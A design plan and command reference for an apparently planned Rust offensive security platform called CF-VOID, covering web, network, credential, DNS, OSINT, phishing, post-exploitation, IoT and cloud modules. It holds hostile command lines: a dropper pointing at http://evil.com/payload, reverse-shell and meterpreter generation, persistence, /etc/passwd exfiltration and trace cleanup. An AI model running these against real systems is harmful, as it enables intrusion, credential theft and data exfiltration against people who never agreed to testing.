# CF-VOID - Complete Offensive Security Platform
## Master Plan Document v1.0

---

## Table of Contents
1. [Overview](#overview)
2. [Key Features](#key-features)
3. [CLI Command Reference](#cli-command-reference)
4. [Attack Modules](#attack-modules)
5. [Architecture](#architecture)
6. [Implementation Phases](#implementation-phases)
7. [Installation](#installation)

---

## Overview

**CF-VOID** is a complete offensive security platform built in Rust, designed for penetration testers, security researchers, and ethical hackers. It combines web vulnerability scanning, network attacks, credential testing, OSINT, and post-exploitation into one powerful tool.

**Inspired by**: OXIDE, Nmap, sqlmap, Burp Suite, Metasploit
**Built for**: Kali Linux, Parrot OS, Termux (Android)
**Language**: Rust (fast, memory-safe, single binary)

---

## Key Features

| Category | What It Does |
|----------|--------------|
| **Web Attacks** | SQLi, XSS, LFI, CMDi, SSTI, SSRF, XXE, IDOR, CORS, race conditions |
| **Network** | Port scan, service enum, OS fingerprint, vuln scan, MITM |
| **Credentials** | Brute force, credential stuffing, password spray, default creds |
| **DNS** | Zone transfer, subdomain enum, DNS spoof, DNS rebinding |
| **OSINT** | Subdomain discovery, email harvest, GitHub dork, social media |
| **Social Eng** | Phishing page generator, payload generator |
| **Post-Exploit** | Persistence, lateral movement, privesc, data exfil |
| **IoT/SCADA** | Modbus, BACnet, MQTT, firmware analysis |
| **Cloud** | AWS, Azure, GCP security audit |
| **AI/ML** | Zero-day detection, polymorphic payloads, anomaly analysis |
| **Evasion** | WAF bypass, encoding, fragmentation, timing attacks |
| **Reporting** | HTML, JSON, CSV, XML, Markdown |

---

## CLI Command Reference

### Basic Syntax
```
cfvoid [command] [options]
```

### Global Options
| Flag | Description |
|------|-------------|
| `-u, --url <URL>` | Target URL |
| `-t, --target <IP/CIDR>` | Target IP or range |
| `-o, --output <path>` | Save report to file |
| `-v, --verbose` | Verbose output |
| `-q, --quiet` | Silent mode |
| `--json` | JSON output |
| `--no-color` | Disable colors |
| `-h, --help` | Show help |

---

### 1. Web Vulnerability Scanning

```bash
# Quick scan - detect all vulnerabilities
cfvoid -u https://target.com

# Scan specific vulnerability
cfvoid -u https://target.com --xss
cfvoid -u https://target.com --sqli
cfvoid -u https://target.com --lfi
cfvoid -u https://target.com --ssti
cfvoid -u https://target.com --ssrf
cfvoid -u https://target.com --xxe
cfvoid -u https://target.com --idor

# Multiple vulnerabilities
cfvoid -u https://target.com --xss --sqli --lfi

# All web attacks
cfvoid -u https://target.com --web-all

# Scan with custom threads
cfvoid -u https://target.com --threads 20

# Scan with depth
cfvoid -u https://target.com --depth 5

# Authenticated scan
cfvoid -u https://target.com --cookie "session=abc123"
cfvoid -u https://target.com --auth "admin:password"
cfvoid -u https://target.com --token "Bearer eyJ..."

# Through proxy (Burp Suite)
cfvoid -u https://target.com --proxy http://127.0.0.1:8080

# Custom headers
cfvoid -u https://target.com --header "X-Auth: token"

# Follow redirects
cfvoid -u https://target.com --follow-redirects

# Ignore SSL errors
cfvoid -u https://target.com --insecure
```

---

### 2. Network Attacks

```bash
# Port scan
cfvoid -t 192.168.1.1 --ports quick      # Top 100 ports
cfvoid -t 192.168.1.1 --ports common     # Top 1000 ports
cfvoid -t 192.168.1.1 --ports full       # All 65535 ports
cfvoid -t 192.168.1.1 --ports 80,443,8080 # Custom ports

# Scan entire subnet
cfvoid -t 192.168.1.0/24 --ports common

# Service enumeration
cfvoid -t 192.168.1.1 --enum-services

# OS fingerprint
cfvoid -t 192.168.1.1 --os-detect

# Vulnerability scan
cfvoid -t 192.168.1.1 --vuln-scan

# Combined network attack
cfvoid -t 192.168.1.1 --network-all

# SYN scan (requires root)
cfvoid -t 192.168.1.1 --syn-scan

# Stealth mode
cfvoid -t 192.168.1.1 --stealth

# Aggressive scan
cfvoid -t 192.168.1.1 --aggressive
```

---

### 3. Credential Attacks

```bash
# Brute force SSH
cfvoid -t 192.168.1.1 --brute-ssh
cfvoid -t 192.168.1.1 --brute-ssh --userlist users.txt --passlist passwords.txt

# Brute force HTTP login
cfvoid -u https://target.com/login --brute-http
cfvoid -u https://target.com/login --brute-http --user admin --wordlist passwords.txt

# Brute force FTP
cfvoid -t 192.168.1.1 --brute-ftp

# Brute force MySQL
cfvoid -t 192.168.1.1 --brute-mysql

# Brute force RDP
cfvoid -t 192.168.1.1 --brute-rdp

# Credential stuffing
cfvoid -u https://target.com/login --creds-stuff --combo combo.txt

# Password spray
cfvoid -u https://target.com/login --pass-spray --pass password123

# Default credentials
cfvoid -u https://target.com --default-creds

# All credential attacks
cfvoid -u https://target.com --creds-all

# Rate limiting (avoid lockout)
cfvoid -u https://target.com --brute-http --rate 10
```

---

### 4. DNS Attacks

```bash
# Zone transfer test
cfvoid -d example.com --zone-transfer

# Subdomain brute force
cfvoid -d example.com --subdomain-brute
cfvoid -d example.com --subdomain-brute --wordlist subdomains.txt

# DNS enumeration
cfvoid -d example.com --dns-enum

# DNS spoof detection
cfvoid -d example.com --dns-spoof

# DNS rebinding
cfvoid -d example.com --dns-rebind

# All DNS attacks
cfvoid -d example.com --dns-all

# Passive DNS
cfvoid -d example.com --passive-dns
```

---

### 5. OSINT Reconnaissance

```bash
# Subdomain discovery
cfvoid -d example.com --osint-subdomains

# Email harvesting
cfvoid -d example.com --osint-emails

# GitHub dorking
cfvoid -d example.com --osint-github
cfvoid -d example.com --osint-github --query "api_key"

# Social media
cfvoid -d example.com --osint-social

# WHOIS lookup
cfvoid -d example.com --osint-whois

# IP lookup
cfvoid -t 1.2.3.4 --osint-ip

# Shodan
cfvoid -d example.com --osint-shodan

# Wayback machine
cfvoid -d example.com --osint-wayback

# All OSINT
cfvoid -d example.com --osint-all
```

---

### 6. Social Engineering

```bash
# Generate phishing page
cfvoid social phish --clone https://target.com/login --output phishing/

# Generate reverse shell payloads
cfvoid social payload --type reverse-shell --lhost 10.0.0.1 --lport 4444
cfvoid social payload --type reverse-shell --format python
cfvoid social payload --type reverse-shell --format php
cfvoid social payload --type reverse-shell --format bash

# Generate bind shell
cfvoid social payload --type bind-shell --lport 4444

# Generate meterpreter
cfvoid social payload --type meterpreter --lhost 10.0.0.1 --lport 4444

# Generate dropper
cfvoid social payload --type dropper --url http://evil.com/payload

# Pretexting templates
cfvoid social pretext --type it-support
cfvoid social pretext --type ceo-fraud
```

---

### 7. Post-Exploitation

```bash
# Check for persistence
cfvoid post --check-persistence

# Establish persistence
cfvoid post --persist --method cron
cfvoid post --persist --method systemd
cfvoid post --persist --method ssh-key

# Lateral movement
cfvoid post --lateral --target 192.168.1.2

# Privilege escalation check
cfvoid post --privesc-check

# Data exfiltration
cfvoid post --exfil --path /etc/passwd --method http

# Cleanup traces
cfvoid post --cleanup

# Full post-exploitation chain
cfvoid post --auto
```

---

### 8. IoT/SCADA Attacks

```bash
# Modbus scan
cfvoid iot --target 192.168.1.100 --protocol modbus --read-params

# BACnet scan
cfvoid iot --target 192.168.1.100 --protocol bacnet --enumerate

# MQTT scan
cfvoid iot --target 192.168.1.100 --protocol mqtt --subscribe-all

# Firmware analysis
cfvoid iot --firmware firmware.bin --analyze

# All IoT attacks
cfvoid iot --target 192.168.1.100 --iot-all
```

---

### 9. Cloud Security

```bash
# AWS audit
cfvoid cloud --provider aws --profile default --audit-all
cfvoid cloud --provider aws --check-s3
cfvoid cloud --provider aws --check-iam
cfvoid cloud --provider aws --check-ec2

# Azure audit
cfvoid cloud --provider azure --profile default --audit-all

# GCP audit
cfvoid cloud --provider gcp --profile default --audit-all
```

---

### 10. AI/ML Features

```bash
# Zero-day detection
cfvoid -u https://target.com --zeroday

# Train ML model
cfvoid -u https://target.com --train

# Anomaly detection
cfvoid -u https://target.com --anomaly

# AI payload mutation
cfvoid -u https://target.com --ai-payloads
```

---

### 11. Evasion Techniques

```bash
# WAF bypass mode
cfvoid -u https://target.com --waf-bypass

# Encoding payloads
cfvoid -u https://target.com --encode base64
cfvoid -u https://target.com --encode url
cfvoid -u https://target.com --encode hex

# Fragmentation
cfvoid -u https://target.com --fragment

# Timing attacks
cfvoid -u https://target.com --timing-random

# User-agent rotation
cfvoid -u https://target.com --random-ua

# IP rotation (requires proxy)
cfvoid -u https://target.com --rotate-proxy
```

---

### 12. Reporting

```bash
# Generate HTML report
cfvoid -u https://target.com -o report.html --format html

# Generate JSON report
cfvoid -u https://target.com -o report.json --format json

# Generate CSV report
cfvoid -u https://target.com -o report.csv --format csv

# Generate Markdown report
cfvoid -u https://target.com -o report.md --format markdown

# Verbose report with all details
cfvoid -u https://target.com -o report.html --format html --verbose
```

---

## Attack Modules

### Web Vulnerability Modules
| Module | Flag | Description |
|--------|------|-------------|
| SQL Injection | `--sqli` | Error, blind, time-based, UNION, stacked |
| XSS | `--xss` | Reflected, stored, DOM-based |
| LFI | `--lfi` | Local file inclusion, path traversal |
| CMD Injection | `--cmdi` | OS command injection |
| SSTI | `--ssti` | Server-side template injection |
| SSRF | `--ssrf` | Server-side request forgery |
| XXE | `--xxe` | XML external entity injection |
| IDOR | `--idor` | Insecure direct object reference |
| CORS | `--cors` | CORS misconfiguration |
| Race Condition | `--race` | Race condition detection |
| Business Logic | `--logic` | Business logic flaws |
| Clickjacking | `--clickjack` | Clickjacking vulnerability |
| Open Redirect | `--redirect` | Open redirect vulnerability |
| CSRF | `--csrf` | Cross-site request forgery |

### Network Attack Modules
| Module | Flag | Description |
|--------|------|-------------|
| Port Scan | `--ports` | TCP/UDP port scanning |
| Service Enum | `--enum-services` | Service version detection |
| OS Detect | `--os-detect` | Operating system fingerprint |
| Vuln Scan | `--vuln-scan` | Network vulnerability scan |
| MITM | `--mitm` | Man-in-the-middle attack |
| ARP Spoof | `--arp-spoof` | ARP cache poisoning |
| DHCP Spoof | `--dhcp-spoof` | DHCP spoofing attack |

### Credential Attack Modules
| Module | Flag | Description |
|--------|------|-------------|
| SSH Brute | `--brute-ssh` | SSH brute force |
| HTTP Brute | `--brute-http` | HTTP login brute force |
| FTP Brute | `--brute-ftp` | FTP brute force |
| MySQL Brute | `--brute-mysql` | MySQL brute force |
| RDP Brute | `--brute-rdp` | RDP brute force |
| Creds Stuff | `--creds-stuff` | Credential stuffing |
| Pass Spray | `--pass-spray` | Password spraying |
| Default Creds | `--default-creds` | Default credentials test |

### DNS Attack Modules
| Module | Flag | Description |
|--------|------|-------------|
| Zone Transfer | `--zone-transfer` | DNS zone transfer test |
| Subdomain Brute | `--subdomain-brute` | Subdomain brute forcing |
| DNS Enum | `--dns-enum` | DNS enumeration |
| DNS Spoof | `--dns-spoof` | DNS spoofing detection |
| DNS Rebind | `--dns-rebind` | DNS rebinding attack |

### OSINT Modules
| Module | Flag | Description |
|--------|------|-------------|
| Subdomains | `--osint-subdomains` | Subdomain discovery |
| Emails | `--osint-emails` | Email harvesting |
| GitHub | `--osint-github` | GitHub dorking |
| Social | `--osint-social` | Social media recon |
| WHOIS | `--osint-whois` | WHOIS lookup |
| IP Lookup | `--osint-ip` | IP information |
| Shodan | `--osint-shodan` | Shodan search |
| Wayback | `--osint-wayback` | Wayback machine |

---

## Architecture

```
cfvoid/
├── Cargo.toml
├── src/
│   ├── main.rs                    # Entry point
│   ├── lib.rs                     # Library root
│   ├── cli/                       # Command-line interface
│   │   ├── args.rs                # Argument parsing (clap)
│   │   ├── tui.rs                 # Interactive terminal UI
│   │   ├── banner.rs              # ASCII banner
│   │   └── output.rs              # Formatted output
│   ├── core/                      # Core engine
│   │   ├── engine.rs              # Main scan engine
│   │   ├── worker.rs              # Async worker pool
│   │   └── coordinator.rs         # Multi-phase orchestrator
│   ├── http/                      # HTTP client
│   │   ├── client.rs              # HTTP client with TLS
│   │   ├── headless.rs            # Chrome headless
│   │   └── proxy.rs               # Proxy support
│   ├── scanner/                   # All scanners
│   │   ├── web/                   # Web vulnerability scanners
│   │   ├── network/               # Network attack modules
│   │   ├── credentials/           # Credential attack modules
│   │   ├── dns/                   # DNS attack modules
│   │   ├── osint/                 # OSINT modules
│   │   ├── social/                # Social engineering
│   │   ├── post/                  # Post-exploitation
│   │   ├── iot/                   # IoT/SCADA attacks
│   │   └── cloud/                 # Cloud security
│   ├── ai/                        # AI/ML engine
│   │   ├── classifier.rs          # ML classifier
│   │   ├── anomaly.rs             # Anomaly detection
│   │   └── mutator.rs             # Payload mutation
│   ├── evasion/                   # Evasion techniques
│   │   ├── waf_bypass.rs          # WAF bypass
│   │   └── encoding.rs            # Payload encoding
│   ├── payload/                   # Payload generation
│   │   ├── generator.rs           # Payload generator
│   │   └── wordlists/             # Built-in wordlists
│   ├── report/                    # Report generation
│   │   ├── html.rs
│   │   ├── json.rs
│   │   ├── csv.rs
│   │   └── markdown.rs
│   └── utils/                     # Utilities
│       ├── crypto.rs
│       └── network.rs
├── config/
│   └── cfvoid.toml               # Default config
├── wordlists/                     # External wordlists
├── build-termux.sh               # Termux build
├── build-kali.sh                 # Kali build
└── install.sh                    # Universal installer
```

---

## Implementation Phases

### Phase 1: Core Engine (Week 1-2)
- [ ] Project setup with Cargo workspace
- [ ] Core async engine with tokio
- [ ] HTTP client with TLS support
- [ ] CLI argument parsing (clap)
- [ ] Basic TUI framework (ratatui)
- [ ] Module trait system
- [ ] Report generation (HTML, JSON)

### Phase 2: Web Scanners (Week 3-4)
- [ ] SQL injection scanner
- [ ] XSS scanner
- [ ] LFI scanner
- [ ] Command injection scanner
- [ ] SSTI scanner
- [ ] SSRF scanner
- [ ] XXE scanner
- [ ] IDOR scanner
- [ ] WAF bypass module

### Phase 3: Network Attacks (Week 5-6)
- [ ] Port scanner (TCP/UDP)
- [ ] Service enumeration
- [ ] OS fingerprinting
- [ ] Network vulnerability scanner
- [ ] MITM attack module
- [ ] ARP spoofing

### Phase 4: Credential Attacks (Week 7-8)
- [ ] Brute force engine
- [ ] SSH/HTTP/FTP/MySQL/RDP brute
- [ ] Credential stuffing
- [ ] Password spraying
- [ ] Default credentials database

### Phase 5: DNS & OSINT (Week 9-10)
- [ ] DNS zone transfer
- [ ] Subdomain enumeration
- [ ] Subdomain brute force
- [ ] Email harvesting
- [ ] GitHub dorking
- [ ] Social media recon
- [ ] Shodan integration

### Phase 6: Advanced Modules (Week 11-12)
- [ ] Social engineering (phishing, payloads)
- [ ] Post-exploitation framework
- [ ] IoT/SCADA protocols
- [ ] Cloud security scanning
- [ ] AI/ML enhancement

### Phase 7: Polish (Week 13-14)
- [ ] Interactive TUI completion
- [ ] Cross-platform builds
- [ ] Package managers
- [ ] Documentation
- [ ] Testing

---

## Installation

### Termux (Android)
```bash
# Install dependencies
pkg install rust binutils

# Clone and build
git clone https://github.com/cfvoid/cfvoid
cd cfvoid
./build-termux.sh

# Or install from package
pkg install cfvoid
```

### Kali Linux
```bash
# Add repository
echo "deb https://cfvoid.github.io/apt stable main" | sudo tee /etc/apt/sources.list.d/cfvoid.list
wget -qO - https://cfvoid.github.io/apt/key.gpg | sudo apt-key add -

# Install
sudo apt update
sudo apt install cfvoid

# Or build from source
git clone https://github.com/cfvoid/cfvoid
cd cfvoid
./build-kali.sh
```

### Parrot OS
```bash
# Same as Kali
sudo apt update
sudo apt install cfvoid
```

### Universal Installer
```bash
curl -sSL https://cfvoid.github.io/install.sh | bash
```

---

## Configuration

Default config file: `~/.config/cfvoid/cfvoid.toml`

```toml
[general]
threads = 10
timeout = 30
verbose = false
output_dir = "./reports"

[scanner]
depth = 3
max_urls = 1000
follow_redirects = true

[credentials]
rate_limit = 10
timeout = 5

[ai]
enabled = true
confidence = 0.7

[evasion]
waf_bypass = true
random_ua = true
```

---

## License

GNU General Public License v3.0 (GPL-3.0)

---

**CF-VOID - See the void. Own the void.**
